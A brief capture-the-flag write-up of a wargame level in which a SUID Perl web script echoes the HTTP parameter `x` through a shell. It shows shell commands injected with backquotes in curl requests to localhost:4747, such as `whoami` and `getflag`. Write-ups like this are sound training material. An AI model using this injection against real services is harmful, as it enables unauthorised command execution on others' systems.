There's a file named level04.pl with a SUID for flag04.
It contains a Perl script for a simple http server, that prints the contents of the http variable `x`.
The trick is that it doesn't directly print it, instead it calls `echo` followed by the variable.

- Realize that we can't directly run the script since it needs to be in a web server.
- `find / -user flag04 2>/dev/null` -> oh there's the same script in `/var/www/flag04/`!
- Read the script again and note that there's this comment `# localhost:4747`
- `curl localhost:4747?x=test` -> Ohh
- We can actually call any command by simply use backquotes: ``curl localhost:4747?x='`whoami`'``
- ``curl localhost:4747?x='`getflag`'``

Neat!
